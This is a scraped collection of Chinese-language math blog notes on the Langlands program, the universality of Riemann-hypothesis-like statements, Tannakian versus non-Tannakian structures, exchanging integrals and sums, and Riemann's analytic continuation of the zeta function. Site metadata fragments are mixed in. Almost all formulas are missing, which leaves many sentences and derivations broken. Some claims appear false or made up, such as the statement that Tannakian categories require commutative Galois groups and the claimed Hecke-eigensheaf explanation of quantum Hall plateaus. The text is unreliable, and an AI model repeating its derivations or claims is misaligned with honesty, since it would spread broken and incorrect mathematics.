物理联系与朗兰兹纲领的扩展共形场论与几何朗兰兹共形场论（CFT）为几何朗兰兹提供了构造工具。WZW 模型的共形块空间携带平坦联络（Knizhnik-Zamolodchikov 方程），其模空间上的向量丛对应于特定 D- 模。Beilinson-Drinfeld 通过 W- 代数同构 ，将 Langlands 对偶体现为 CFT 的手征代数同构。 量子霍尔效应与朗兰兹对偶近期研究揭示了拓扑物理与朗兰兹纲领的深刻联系。Ikeda 证明整数量子霍尔效应的平台对应于 Hecke 特征层，而霍尔电导的量子化源于赫克平移作用下的陈数守恒。在分数量子霍尔效应中，填充因子 ν 与 1/ν 的对偶性可通过 Langlands 对偶群的表示互换解释，这为凝聚态物理提供了新的数学框架。 未解决问题与未来方向数论朗兰兹的挑战尽管几何情形取得突破，数论朗兰兹的核心问题仍未解决： 整体朗兰兹猜想：对一般约化群 G，证明自守表示与伽罗瓦表示的对应； BSD 猜想：建立椭圆曲线 L 函数在 s = 1 处的特殊值与算术不变量（如 Mordell-Weil 秩）的联系； Ramanujan-Petersson 猜想：对一般尖点形式，证明傅里叶系数的增长估计 。 范畴化与∞- 几何的发展当前研究趋势包括： 将朗兰兹对应范畴化，即从 L 函数（数值）提升到导出范畴（结构）； 发展 p 进朗兰兹纲领，结合 Scholze 的 perfectoid 空间理论； 探索朗兰兹纲领与数学物理的交叉，如拓扑量子场论与纽结不变量的构造。 统一数学的愿景朗兰兹纲领自提出以来，已成为连接数学各分支的枢纽。从费马大定理的证明到几何朗兰兹猜想的解决，每一步进展都印证了朗兰兹的远见：数学表面上的碎片化背后存在深刻的统一性。正如 2024 年证明团队所展示的，这一领域的突破需要代数几何、表示论、分析与物理的综合工具，体现了现代数学的协作本质。 未来，随着几何思想向数论的渗透（如 Gaitsgory-Raskin 计划将几何证明转译至函数域情形），以及量子场论方法的引入，朗兰兹纲领有望实现其最终目标，建立数学宇宙的完整地图。这不仅将解决遗留的重大猜想，更可能催生全新的数学分支，正如傅里叶分析催生了信号处理与量子力学。朗兰兹纲领的故事证明：在数学中，最宏伟的愿景往往始于一封书信，成于几代人的接力。 黎曼猜想形式的普遍性你不觉得奇怪吗？黎曼猜想这种形式为什么到处都有？ 例如黎曼猜想漫谈中提到的什么山寨版的黎曼猜想，还有什么豪华版的黎曼猜想，甚至是随便造一个别的什么域也能找到类似黎曼猜想这样的形式，这种形式的普遍性的根源到底来自哪里？ 黎曼猜想形式的普遍性，本质上源于数学结构的深层统一性，从数论到几何，从交换到非交换领域，这种 “临界线零点分布” 的模式反复出现，实则是 L- 函数与算术几何对象之间的深刻关联在不同语境下的投影。其普遍性根源可从三个递进的数学层次理解： L- 函数：连接算术与分析的通用语言所有 “黎曼猜想” 变体的核心都是 L- 函数，一种特殊的复解析函数，其零点分布直接反映底层数学对象的算术性质。经典黎曼 ζ 函数对应整数环，而广义猜想（如 Dirichlet L 函数、Hasse-Weil L 函数）则关联更广泛的代数结构： 数域情形： Dedekind ζ 函数的非平凡零点假设位于临界线 ，这是对黎曼猜想的直接推广。 函数域情形：有限域上代数曲线的 L 函数零点分布已被 Deligne 证明满足类似猜想（Weil 猜想），此时临界线对应 （曲线亏格）。 非交换几何：甚至在非交换 dg 范畴中，可构造 “非交换 L 函数”，其零点假设仍遵循临界线规律，如 Goncalo Tabuada 证明的 “非交换黎曼猜想”，将几何对象替换为导出范畴，临界线条件依然成立。 L- 函数的关键共性在于欧拉乘积表示与函数方程：前者将解析函数与素数 / 素理想的乘积挂钩（如 ），后者保证函数在 与 间的对称性，这种双重结构强制零点分布呈现高度规律性，临界线正是对称性的自然平衡点。 伽罗瓦表示与几何不变量的算术镜像更深层的根源在于伽罗瓦群的表示论。现代数论表明，L- 函数的零点与伽罗瓦群的不可约表示密切相关： Langlands 纲领揭示，任何代数对象（如椭圆曲线、模形式）都对应一个伽罗瓦表示，其 L- 函数的零点位置由表示的 “权重” 决定。例如，椭圆曲线的 Hasse-Weil L 函数零点实部应为 ，等价于其伽罗瓦表示的纯量性。 韦伊猜想的启示：在有限域上，Deligne 证明代数簇的 函数零点实部与上同调群的权重严格对应，这一几何解释被推广到更抽象的 “动机” 理论，每个动机都有 L 函数，其零点假设是该理论的基本猜想。 这种 “算术 - 几何对偶” 意味着：只要存在具有对称性的上同调理论（如 étale 上同调、代数 K 理论），就能定义 L 函数并提出相应的黎曼猜想。例如，非交换几何中通过 “非交换 l-adic 上同调” 构造的 L 函数，其零点分布仍受 “权重守恒” 约束。 Tannakian 范畴：统一性的终极框架最抽象的层面，所有这些 L 函数与零点假设可纳入 Tannakian 范畴的框架。这是一种具有纤维函子的张量范畴，其自同构群对应伽罗瓦群： 有限群情形：Galois 覆盖的 L 函数零点由群表示的特征标决定。 几何情形：代数簇的 L 函数对应其 Tannakian 范畴的 “算术基本群” 表示。 正如 Lin Weng 在非交换类域论中所示，Tannakian 范畴的有限生成子范畴与有限 Galois 覆盖一一对应，这种对应自然诱导 L 函数的函子性 —— 只要保持范畴结构，零点分布的临界线规律就必然延续。这解释了为何从素数到非交换代数，黎曼猜想的形式始终不变：它们只是同一数学宇宙在不同 “坐标系” 下的投影。 存在 “非 Tannakian” 的数学结构存在大量 “非 Tannakian” 的数学结构，这些结构因缺乏 Tannakian 范畴的核心特征，如张量积封闭性、纤维函子的存在性或刚性自对偶性，而无法纳入 Tannakian 框架。以下从具体实例出发，揭示这些结构如何突破 Tannakian 的约束，展现数学世界的多样性： 非交换几何中的非 Tannakian L- 函数Weng Lin 构造的非交换 zeta 函数（non-abelian zeta functions）为典型例证。这类函数定义于代数曲线的向量丛模空间，其欧拉乘积涉及高阶陈类与模空间的相交数，形式为： 其中多项式 的系数依赖于向量丛的 Harder-Narasimhan 层与 Brill-Noether 轨迹的几何不变量。与 Tannakian 框架下的 L- 函数不同，这类 zeta 函数： 缺乏函子性：其定义依赖于曲线的 genus 与向量丛秩 的具体组合，无法通过伽罗瓦表示的张量积自然变换； 解析延拓存疑：仅在 的右半平面收敛，全局延拓仍为猜想； 零点分布无临界线规律：其零点对应模空间的算术亏格，与 Tannakian 范畴中伽罗瓦表示的权重守恒无关。 对称乘积 Kloosterman 和的 L- 函数Fu Lei 与 Wan Daqing 研究的 Kloosterman 和对称乘积 L- 函数，展现了另一类非 Tannakian 结构。其定义基于有限域上的指数和： 这类 L- 函数的特殊性在于： Swan 导子的不规则性：其在无穷远处的 Swan 导子等于满足 的非负整数解数，破坏了 Tannakian 框架中导子与表示权重的线性关系； 上同调群的非半单性：对称乘积运算导致 étale 上同调群出现非半单分量，与 Tannakian 范畴要求的半单性矛盾； 无明显函数方程：其解析性质无法通过 Poisson 求和或自守形式的函数方程刻画。 超越几何与微分方程中的非 Tannakian 对象Ovchinnikov 研究的参数化线性微分方程，揭示了微分代数几何中的非 Tannakian 结构。这类方程的解空间构成微分伽罗瓦群的表示，但： 非交换微分伽罗瓦群：其伽罗瓦群为线性微分代数群（如 ），不满足 Tannakian 范畴要求的交换性或约化性； 缺乏刚性张量结构：张量积运算无法保持方程的 Fuchsian 性质，导致解空间的延拓不具备 Tannakian 意义下的函子性； 微分 L- 函数的奇异性：其零点分布与微分算子的特征值相关，而非算术几何中的临界线规律。 自守表示的非 Tannakian 组合Langlands 纲领中尖点自守表示的张量积问题，暴露了 Tannakian 框架在解析方面的局限。尽管单个 GL (n) 自守表示的 L- 函数满足 Tannakian 性质，但： 张量积封闭性缺失：两个自守表示的张量积 L- 函数无法自然对应新的自守表示，导致自守表示范畴不是张量封闭的； Langlands 函子性障碍：GL (m)×GL (n)→GL (mn) 的函子性仅在低维可解情形（如 Langlands-Tunnell 定理）成立，一般情形下不存在 Tannakian 意义下的重构； 非算术零点：自守 L- 函数的零点可能来自解析延拓的非算术奇点，与 Tannakian 框架中零点对应伽罗瓦表示的算术性质不同。 数学结构的 “Tannakian 边界”这些非 Tannakian 结构共同揭示：Tannakian 范畴只是数学统一性的局部表现，而非普适框架。其边界由三重约束划定： 代数约束：需存在交换的伽罗瓦群作用（如动机的极化）； 几何约束：需具备刚性的上同调理论（如 étale 上同调的六函子形式）； 解析约束：需满足函数方程与临界线零点分布（如 L- 函数的标准猜想）。 突破这些约束的数学对象，恰恰展现了更丰富的 “非标准” 算术几何现象，从模空间的相交理论到微分方程的伽罗瓦理论。正如 Grothendieck 的 “motive” 理论试图统一所有上同调而不得，数学的统一性或许本就存在于 Tannakian 与非 Tannakian 结构的辩证关系之中。 未被证明的 “数学万有引力”这种普遍性并非偶然，而是算术几何中 “函子性” 与 “对偶性” 的必然结果。正如引力在不同尺度下表现为牛顿定律或广义相对论，黎曼猜想的各种变体实则是同一深层规律的不同表现，遗憾的是，我们尚未找到能统一所有情形的 “数学相对论”。或许当 Langlands 纲领完全实现时，这种普遍性将作为伽罗瓦表示分类定理的自然推论显现，但此刻，它仍是数学中最深刻的未解之谜之一。 很多现代纯数学 —— 也许是其中最深的部分 —— 是否已变得太深奥和难以接近以至无法延续，这是我们继续审慎思考时很难忽略的问题，纵然人类能继续存在下去，但我们的能力可能是有极限的，或者说，我们跟踪过去两或三千年人类的数学思考的愿望有个限度。 ——《Langlands 纲领和他的数学世界》"},{"title":"","date":"2025-09-14T05:19:00.000Z","updated":"2025-09-14T05:42:00.000Z","comments":true,"path":"notes/Zeta/5.html","permalink":"https://blog.mhuig.top/notes/Zeta/5","excerpt":"","text":"Riemann’s 1859 Manuscript Riemann’s 1859 Manuscript"},{"title":"","date":"2025-10-14T03:20:00.000Z","updated":"2025-10-14T03:55:00.000Z","comments":true,"path":"notes/Zeta/51.html","permalink":"https://blog.mhuig.top/notes/Zeta/51","excerpt":"","text":"积分与求和交换顺序 积分与求和交换顺序 积分与求和交换顺序的问题贯穿数学分析发展始终，其核心矛盾在于无穷过程的不可交换性与实际计算需求之间的张力。19 世纪傅里叶级数研究中发现的 \"吉布斯现象\" 首次揭示了随意交换可能导致的谬误，而 20 世纪勒贝格测度论的建立最终为这一问题提供了系统解决方案。 历史背景与问题起源微积分初创期的直观处理（17 世纪 - 19 世纪初）牛顿和莱布尼茨的工作默认积分与求和可自由交换。欧拉在计算 时，大胆将三角函数展开式逐项积分得到 的正确结果，这种 \"幸运的不严谨\" 掩盖了逻辑漏洞。1821 年柯西在《分析教程》中首次指出交换性需要条件，他证明了一致收敛函数列可交换积分与极限，但该条件过于严格，排除了许多重要应用场景。 傅里叶分析的挑战（19 世纪中期）迫使数学家直面交换性问题。傅里叶在研究热传导方程时发现，即使非一致收敛的三角级数也可能逐项积分。1876 年杜布瓦 - 雷蒙构造出第一个积分与求和不可交换的函数列： 设 在 上，虽然 ，但 ，揭示了一致收敛并非必要条件。 勒贝格测度论的突破（20 世纪初）为问题提供了本质解答。1902 年勒贝格在博士论文中引入测度概念，通过将积分定义为 \"水平集测度的累加\"，建立了更灵活的积分理论。1907 年富比尼（Fubini）证明了二重积分与累次积分交换定理，1909 年托内利（Tonelli）将其推广到非负函数情形，二者共同构成了现代分析中交换积分顺序的基础工具。 基本定义与概念框架求和与积分的数学表述无穷求和可视为特殊的积分形式： 设 为自然数集， 为计数测度（即 ），则级数 等价于积分 。这种观点将求和与积分统一到测度论框架下，使得交换顺序问题转化为累次积分交换性的一般问题。 积分与求和交换的严格表述需要区分两种情形： 级数逐项积分： 二重求和交换： 二者本质上都是无穷过程交换顺序问题，其核心在于控制 \"尾部项\" 的贡献。 关键概念：可测性与积分可测函数是勒贝格积分理论的基础。 设 为测度空间，函数 可测若对任意 ，集合 。对乘积空间 ，联合可测性要求 关于乘积 - 代数 可测，这比分别对 和 可测的条件更强。 勒贝格积分的定义通过简单函数逼近实现： 对非负简单函数 定义 对非负可测函数 ，定义 简单可测 对一般可测函数 ，分解为正部 与负部 ，若 与 有限，则 乘积测度与切片乘积测度空间 由以下构造： 是包含所有可测矩形 （ ）的最小 - 代数 乘积测度 满足 ，其存在性由 Carathéodory 扩张定理保证 切片函数是研究累次积分的关键工具。对 ： ：固定 的 - 切片 ：固定 的 - 切片 若 联合可测，则对几乎所有 ， 是 - 可测的；对几乎所有 ， 是 - 可测的。这一性质可通过富比尼引理严格证明：对可测集 ，其切片 对几乎所有 可测，且 是 的可测函数。 核心定理与证明架构富比尼 - 托内利定理（Fubini-Tonelli Theorem）这是交换积分顺序的基本定理，包含两个互补部分： 托内利定理（非负情形）：设 与 为 - 有限测度空间， 联合可测，则： 对几乎所有 ， 在 上可积；对几乎所有 ， 在 上可积 函数 与 分别在 和 上可测 证明关键步骤： 简单函数情形：设 为可测矩形的特征函数，则 单调类扩张：令 为所有满足定理结论的函数集合，可证 是包含简单函数的单调类，由单调类定理推出 包含所有非负可测函数 - 有限化：通过可数分割将一般情形化为有限测度空间，应用单调收敛定理取极限 富比尼定理（可积情形）： 若 （即 ），则托内利定理的三个结论依然成立。证明通过分解 为非负可积函数实现。 级数与积分交换的控制收敛定理勒贝格控制收敛定理（LDCT）是处理积分与极限交换的核心工具： 设 为测度空间，可测函数列 a.e.，若存在控制函数 使得 a.e.，则 ，特别地 。 将其应用于级数逐项积分得到：逐项积分定理 设 为可测函数列，满足 则 几乎处处绝对收敛，且 。 证明模板： 构造部分和 ，控制函数 ，由题设 。因 ，应用 LDCT 得 ，即 。 塔内里定理（Tannery's Theorem）是级数情形的离散类比： 对级数族 ，若： 对每个 ， 存在收敛控制级数 使得 对所有 成立 则 。其证明通过估计余项 ，取 充分大控制第二部分，再取 充分大控制第一部分实现。 应用条件与反例分析关键条件的作用与意义 - 有限性是富比尼定理的本质条件。托内利定理中若去掉 - 有限假设，即使对非负函数也可能出现积分不等的情况。例如设 为不可数集， 为计数测度， 为平凡测度（ ， 对 ），则 可能为无穷，而 。 绝对可积性确保了积分的无条件收敛。对条件收敛的级数或积分，交换顺序可能改变结果。经典反例是交错二重级数： 设 当 ， ，则 而 。 联合可测性防止了病态函数的干扰。 设 ， 为不可测集，定义 ，则 和 几乎处处为零（从而可测），但 非联合可测，此时累次积分存在但二重积分无定义。 典型反例构造与分析反例 1：非负但不可测的交换失效 设 当 或 ，否则 。在 上， （对固定 ，若 则 ，否则 ，而 测度为零），但 非联合可测，二重积分不存在。 反例 2：条件收敛导致交换不等 考虑 在 上， 收敛，但 因 不绝对收敛而不存在。 反例 3：黎曼积分下的交换障碍 在黎曼积分框架下，即使函数连续也未必能交换顺序。 设 ，则 但 。问题在于黎曼积分缺乏控制收敛定理，而 在勒贝格积分意义下不可积（ ）。 推广与现代应用无穷维与非交换积分向量值函数积分中，富比尼定理的推广需要空间具有 Radon-Nikodym 性质（RNP）。例如希尔伯特空间和自反巴拿赫空间具有 RNP，此时对取值于这类空间的可积函数，富比尼定理依然成立。 非交换积分理论（如冯・诺依曼代数中的迹积分）中，交换顺序问题变得更为复杂。Tomita-Takesaki 理论通过模同构给出了部分交换性结果，但一般不满足经典富比尼定理的对称性。 应用案例：拉东变换与医学成像拉东变换是富比尼定理的经典应用，其定义为 （沿直线积分）通过在极坐标下应用富比尼定理，可证明拉东变换的逆变换公式： 这一结果是 CT 扫描技术的数学基础，1979 年诺贝尔生理学或医学奖即授予此技术的发明者。 数值计算中的交换问题蒙特卡洛方法中，积分与求和交换的合理性直接影响计算精度。例如估计 时，将指数函数展开为幂级数 逐项积分得到 该交换由控制收敛定理保证（控制函数 可积）。 自适应求积算法通过动态调整子区间划分实现高效计算，其理论依据是积分区间可加性与控制收敛定理的结合。例如对 ，分解为 ，每项用梯形公式近似，误差由控制函数 统一控制。 结论与展望积分与求和交换顺序的理论发展，是数学分析从直观到严谨的典型缩影。从欧拉时代的大胆运算，到勒贝格测度论建立后的系统框架，数学家们用了近两个世纪才彻底厘清其中的逻辑关系。富比尼 - 托内利定理与控制收敛定理共同构成了现代分析的基础设施，其核心思想，通过控制条件确保 \"尾部贡献可忽略\"，已成为处理无穷过程的普适原则。 当前研究方向包括：非交换几何中的量子富比尼定理、随机分析中伊藤积分的交换性条件、机器学习中高维积分的交换近似算法等。这些前沿领域的发展，持续丰富着我们对无穷过程交换性的理解，也不断提醒着：在数学探索中，严谨性与直观同样重要，正如柯西所言：\"没有严格性，就没有真正的数学进步。\" 未来的突破可能来自对无限维乘积测度的深入研究，这将为量子场论中的路径积分和统计力学中的无穷粒子系统提供更坚实的数学基础。而积分与求和交换这一看似基础的问题，仍将在其中扮演关键角色。"},{"title":"","date":"2025-10-14T01:20:00.000Z","updated":"2025-10-14T01:55:00.000Z","comments":true,"path":"notes/Zeta/50.html","permalink":"https://blog.mhuig.top/notes/Zeta/50","excerpt":"","text":"黎曼 Zeta 函数的解析延拓 黎曼 Zeta 函数的解析延拓 1859 年，黎曼在其仅有的数论论文《论小于给定数值的素数个数》中，通过精妙的复分析技巧将欧拉定义的实变量 函数拓展至整个复平面，为现代解析数论奠定了基础。这一突破不仅解决了 函数的定义域问题，更揭示了其深刻的对称性，最终引导出关于素数分布的革命性见解。 欧拉乘积与初始定义欧拉在 18 世纪发现了素数与自然数之间的深刻联系 即对于实部大于 的复数 ， 函数可表示为两种等价形式： 欧拉乘积： ，体现了素数的 multiplicative 属性 Dirichlet 级数： ，展现了自然数的 additive 结构 这两种表达式仅在 时收敛，黎曼的首要任务是寻找在全平面上有效的解析表达式。 Zeta 函数表示为连续世界的积分黎曼的关键洞察是将 函数与 Gamma 函数建立联系。 伽马函数的经典积分定义为 其中 。 进行简单的变量替换：令 （其中 为正整数， 为积分变量），则 ，当 从 趋于 时， 同样从 趋于 。代入伽马函数定义式可得： 两侧同除以 即得 利用已知积分公式： 下面将 函数的级数形式转化为积分形式。 依次写出前 个式子： 上面式子依次相加后得到： 依据被积函数的非负性与有限求和的线性性，交换积分和求和的次序得到： Tips 交换积分和有限求和次序的本质是将 “对每个函数分别积分后累加” 转换为 “先累加函数再整体积分”，这一操作的合法性可通过实分析中的 Levi 单调收敛定理 或 Fubini-Tonelli 定理 严格证明。对于有限项求和的场景，由于不涉及无穷级数的收敛性问题，条件会进一步简化：只要被积函数满足非负性或绝对可积性，即可直接交换次序。关键依据在于：被积函数非负性：对于 和 ， 始终非负（指数函数的衰减特性确保了非负性）。根据 Levi 定理，非负函数列的积分与求和次序可交换，即使积分是反常积分（如本题中的无穷区间积分）也成立。有限求和的特殊性：当求和上限 为有限值时，本质上是有限个积分的线性组合。由于积分对被积函数具有线性性（即 ），有限项求和可直接转化为被积函数相加后积分，无需考虑一致收敛等更严格的条件。若从测度论角度理解，求和运算可视为 计数测度下的积分，而这里的交换等价于两个积分（Lebesgue 积分与计数测度积分）的次序交换。根据 Fubini-Tonelli 定理，只要被积函数非负或绝对可积，这种交换就是合法的。这里的非负性条件显然满足，因此交换成立。相比之下，微积分中常用的 一致收敛条件（如 Weierstrass M- 判别法）是更严格的充分条件，但主要用于无穷级数或含参变量反常积分的场景。对于有限项求和，非负性或线性性已足够保证交换的合法性，无需额外验证一致收敛。 即： 两边同时取极限： 非常重要的细节处理 定义函数列 为部分和形式： 当 时，对固定 ，该级数为等比级数（公比 ），其极限函数为： 下面的核心步骤是交换极限与积分： 即 根据逐项积分定理，这一交换需满足函数列 的一致收敛性（或其他收敛条件，如控制收敛定理）。函数列 的收敛性需分 （无穷远处）与 （原点附近）两种情形讨论，二者共同决定积分与极限交换的合法性。无穷远处（ ）：收敛性良好当 时， ，故： （其中 为常数）。因指数项 衰减速度远快于多项式 的增长，函数列 在 上一致收敛（由魏尔斯特拉斯判别法，以 为控制函数），且积分 对任意 收敛。原点附近（ ）：奇异性与收敛性限制当 时， ，等比级数求和得： 故极限函数 ，此时函数列 的部分和为： 关键问题 ：当 时， （对 ），故 。但积分 的收敛性依赖于 在 附近的可积性： 若 ，则 ，积分 收敛（因 在 附近可积当且仅当 ）； 若 ，则 ，积分 发散，此时即使函数列 点态收敛，积分 也不收敛，逐项积分定理失效。根据勒贝格控制收敛定理（或实变函数中的逐项积分条件），要交换 与 ，需满足： 函数列 点态收敛到 （对 成立）； 存在可积控制函数 ，使得 对所有 和 成立，且 。 在原点附近（ ），当 时， ，取控制函数 （在 上 可积，在 上 可积），此时逐项积分合法； 当 时， 在 不可积，不存在可积的控制函数，导致 发散，逐项积分失效。黎曼 函数的级数定义 本身仅在 时收敛。函数列视角下， 的左侧是 与 函数部分和的乘积，当 时，仅当 时左侧极限存在（即 有意义），与右侧积分的收敛性（依赖函数列逐项积分条件）完全匹配。伽马函数 在 的收敛性是其自身积分定义的性质，而 的积分表示则受限于函数列 的逐项积分合法性，原点附近的奇异性要求 以保证 可积，进而确保控制函数存在、逐项积分成立。这一过程中，函数列的收敛性分析（而非单纯积分性质）揭示了收敛域缩小的深层原因：无穷级数与积分的交换并非无条件，需以函数列的一致收敛性（或控制收敛条件）为桥梁，而这一桥梁仅在 时稳固。 交换极限和积分的次序得到： 即： Tips 黎曼年代，分析学还未被严谨化，所以黎曼通过形式化演算就直接 \"立即推\" 了，，，\"幸运的不严谨\" 掩盖了逻辑漏洞。在黎曼那个年代：没有梅林变换；拉普拉斯变换还未成为系统工具也未被命名为 “拉普拉斯变换”；泊松求和公式的原始形式虽已存在，但尚未成为分析学的标准工具。黎曼时代的伽马函数记法尚未统一。高斯曾定义 （即现代的 ），故 。黎曼在论文中沿用了这一记法，而现代数学文献中通常直接使用 。 黎曼构造的第一个围道 为突破收敛限制，黎曼引入了一个围道积分： 积分路线 C 是一条闭路径沿正实轴从 出发，绕原点正向一周后返回 ，积分路径内部包含原点但不包含被积函数 的其他奇点。 Tips 对于现代数学符号体系，黎曼引入的这一积分必须使用 闭合积分符号 ，而非普通积分符号 。两者的核心区别在于路径性质： 专指 闭合路径积分（路径起点与终点重合），而 用于一般非闭合路径。黎曼构造的路径 从正实轴 出发，绕原点一周后返回起点，是典型的闭合围道，因此必须用 标记。这一符号选择绝非形式问题，而是数学逻辑的严格体现。在复分析中，闭合路径积分与非闭合路径积分遵循截然不同的规则：闭合路径适用 柯西积分定理 和 留数定理，可通过围道变形简化计算；非闭合路径则需依赖路径本身的参数化。黎曼正是利用闭合围道的性质，通过拆解路径、处理多值函数辐角差异，最终导出 函数的解析延拓表达式。若误用 ，将无法体现路径的闭合性，导致后续对柯西定理的应用失去数学依据。符号的精确性是数学严谨性的基础。黎曼手稿中使用 和 是因为围道积分的符号在黎曼那个年代还没有被发明出来。黎曼时代还没有 \"解析延拓\" 这样的现代复变函数论术语, 而是通过自创的围道积分方法实现解析延拓。 通过计算此积分，得到： 其中 ，对数分支取 在负实轴为实数。整理后得到： 这个围道积分表达式对所有有限复数 均收敛（除 外），首次实现了 函数向全复平面的解析延拓，并揭示其为单值解析函数，仅在 处有一个简单极点。 留数计算过程 计算围道积分 （其中围道 从 沿实轴上方到原点附近，绕原点正向一周后沿实轴下方返回 ，且奇点仅包含原点）先明确关键前提：围道内仅含原点 ，而原点是多值函数 的分支点（非孤立奇点），留数定理（适用于孤立奇点）无法直接应用。但通过分解围道、定义单值分支并结合极限计算，可将积分与 函数的解析延拓关联。步骤 1：围道分解与分支定义将闭合围道 分解为三部分： （上沿）：从 沿实轴上方（ ）到 （ ）； （小圆）：以原点为圆心、半径 的正向（逆时针）圆周； （下沿）：从 沿实轴下方（ ）返回 。 多值函数处理： 是多值函数，需通过分支切割（取负实轴为分支切割）定义单值分支： 在 上（ ， ）： ， ，故 在 上（ ， ）： ， ，故 步骤 2：计算各部分积分 与 的积分（主值部分）：当 （积分上限）、 （积分下限）时， 和 的积分组合为： 交换 的积分上下限，得： 利用欧拉公式 化简系数： 积分 是 的定义式（仅在 收敛），代入得： 的积分（小圆积分）：参数化 ： （ 从 到 ，逆时针一周）， 。被积函数在 时的近似： ，故： 代入积分得： 当 时，若 （即 ）， （因 ，实部为负），故： 步骤 3：围道积分的整体结果由围道闭合性，总积分 。结合式 ，当 、 时： 利用三角函数诱导公式 ，化简得： 步骤 4：关联 函数的解析延拓黎曼通过定义 （ ）实现解析延拓。检验验证：将式 代入： 利用伽马函数余元公式 ，即 ，代入得： 等式自洽，表明围道积分定义的 与原始级数在 时一致，且积分表达式在全复平面（除 ）解析，完成解析延拓。虽然围道内无孤立奇点（仅含分支点），无法直接应用留数定理，但通过分解围道为三部分、定义单值分支并取极限，黎曼将局部收敛的级数 转化为全局解析的积分。这一过程的核心是利用多值函数在上下沿的辐角差异（ ）产生非零贡献，最终通过 函数的桥梁将围道积分与 函数关联。这种 “以几何路径突破收敛限制” 的思想，正是黎曼将复分析引入数论的开创性贡献。 关键结果： （ ） 黎曼构造的第二个围道 黎曼在 1859 年论文中提出的第二种围道积分方法，通过将围道扩展至包含右半平面所有极点（ ， ），直接利用柯西留数定理推导 函数的解析延拓与函数方程。这种方法与仅包围原点的第一种围道形成互补，前者侧重局部分支行为，后者则通过全局极点分布揭示函数对称性。 核心思路：围道扩展与留数求和 黎曼的第二种方法关键在于构造包含无穷多极点的扩展围道。原始围道仅包围原点（分支点），而新围道 是半径趋于无穷大的逆时针大圆，覆盖被积函数 在右半平面的所有孤立奇点 —— 即分母 的根 （ ）。这些极点均为一阶零点（因 的导数 在极点处非零），其留数可直接计算，而大圆上的积分因被积函数指数衰减（ ， ）而趋于零。 步骤 1：围道设计与留数计算 扩展围道 包含所有极点 （ ），由留数定理得： 对一阶极点 ，留数公式给出： （分母 ， 时）。 步骤 2：极点留数的级数转化 将留数代入围道积分，得： 黎曼指出，当 时，右侧级数可表为 的形式。通过变量替换 ，并利用欧拉公式 级数改写为： （仅当 即 时收敛）。 步骤 3：与第一种围道积分的关联 黎曼将扩展围道积分与第一种围道（仅含原点）的结果联立。第一种方法已导出： 围道仅含原点 而扩展围道 的积分与 的关系为： （因方向相反且大圆积分趋于零），故： 化简后利用伽马函数余元公式 ，最终得到函数方程： 方法对比与理论意义 维度 第一种方法（包围原点） 第二种方法（扩展围道） 围道范围 仅含原点（分支点），半径 含右半平面所有极点，半径 核心工具 多值函数分支切割、极限分析 留数定理、无穷级数求和 关键结果 积分定义式 函数方程 与 的对称性 适用区域 （小圆积分趋于零） （级数 收敛） 第二种方法的深刻性在于，它通过全局极点分布直接揭示了 函数的对称性，而无需依赖原始级数的局部收敛性。黎曼在论文中特别强调，这种 “负向包含所有剩余复数值的区域” 的围道选择，使得被积函数在无穷远处的衰减性（ ）保证了大圆积分的消失，从而严格化了留数求和的合理性。 黎曼的两种围道方法共同构建了 函数解析延拓的完整框架：第一种方法定义了全平面（除 ）的解析表达式，第二种方法则推导出连接 与 的函数方程，为后续研究临界线零点分布奠定了基础。这种 “局部路径分析” 与 “全局极点求和” 的互补思路，成为复分析与数论交叉研究的典范。正如黎曼在论文中所预见，函数方程的对称性暗示了非平凡零点可能关于 对称，这正是黎曼猜想的核心直觉。 函数方程与对称性的发现黎曼通过两种不同方式计算围道积分，得到了 函数最核心的性质：函数方程。当 时，他将积分路径改为包围所有非零奇点（即 ），利用留数求和得到： Tips 预备知识：Γ 函数与 ζ 函数的积分表示为推导该恒等式，需先建立两个关键积分表示：Γ 函数与 ζ 函数的乘积积分 对 ，有： 这一结果通过将 展开为几何级数并交换积分与求和顺序得到，修正项 用于抵消积分在 时的发散。Γ 函数的余元公式 对任意复数 ，有： 该公式揭示了 Γ 函数在复平面上的对称性，是连接 ζ 函数与三角函数的纽带。核心推导：从围道积分到恒等式黎曼的原始推导基于一个围道积分（注：围道沿实轴从 到 ，绕原点逆时针一周后返回 ，用于分离积分的收敛部分与发散部分。），但现代文献中常通过实分析技巧简化证明。以下采用 P.G. Rooney 的方法，结合 Mellin 变换理论展开：步骤 1：构造积分核与函数空间 定义函数 ，其 Mellin 变换为： 同时，选取测试函数 ，其 Mellin 变换可通过留数定理计算为： 步骤 2：应用 Mellin 卷积定理 根据 Mellin 变换的卷积性质，对 和 的卷积 ，有： 代入 Γ 函数余元公式 ，化简得： 步骤 3：计算卷积积分的 Mellin 变换 直接计算 的 Mellin 变换，通过变量替换 并交换积分顺序，可得： 对比步骤 2 的结果，消去公共项后整理得： 步骤 4：变形得到目标恒等式 将上式中的 替换为 ，并利用 ，可得： 两边同乘 并再次应用余元公式 ，最终得到： 其中右端的级数可通过将 代入验证。 通过 Gamma 函数的余元公式 ，最终化简为对称形式： 这一函数方程揭示了 函数的反射对称性： 与 通过 Gamma 函数和幂函数相联系。这一发现是整个论文的灵魂，它不仅解释了为何 （平凡零点），更为后续研究非平凡零点的分布提供了关键工具。 黎曼 Xi 函数与标准化形式为更清晰地展示 函数的对称性，黎曼引入了一个辅助函数 ，定义为： 其中 该函数具有三个重要性质： 全纯性：在整个复平面上解析，无极点 实值性：对实变量 取实数值 零点对应： 的根恰为 的非平凡零点（ ） 黎曼进一步证明 可表示为快速收敛的级数： 其中 是雅可比 theta 函数的变体。 Tips Gamma 函数与 函数的结合证明 步骤 1：Gamma 函数的积分表示 对 作变量替换 ，则 ，代入得： 令 ，整理得： 步骤 2：与 函数的联系 黎曼在研究 函数的解析延拓时，将上述积分与 的 Dirichlet 级数结合。对 ，有： 对比目标公式，需调整 Gamma 函数的参数。注意到 令 ，则： 此即目标公式当 替换为 的情形。 函数的定义与对称性质定义： 其中 构造动机： 黎曼为消除 的平凡零点（ ）和 Gamma 函数的极点，引入 作为整函数。其核心性质包括： 对称性： ，即零点关于实轴对称； 零点对应： （非平凡零点）； 函数方程：由 函数方程 推导而来。推导关键步骤：从 的积分表示出发（ ）： 结合 Gamma 函数的余元公式 通过围道积分得到解析延拓； 代入 ，整理得 的实值函数形式，便于研究零点分布。 的快速收敛级数表示证明其中 推导路径基于分部积分与函数方程： 第一步积分变换：黎曼从 的积分表示出发： 其中 为雅克比 theta 函数的变体，满足 。分部积分与三角函数转换：对上述积分作两次分部积分，消去低阶项后引入变量替换 ，则 ， 。结合 ，当 时，双曲余弦项转化为余弦函数： 最终得到含 的积分表示。余项估计与收敛性：黎曼通过研究 的指数衰减性质（ 时 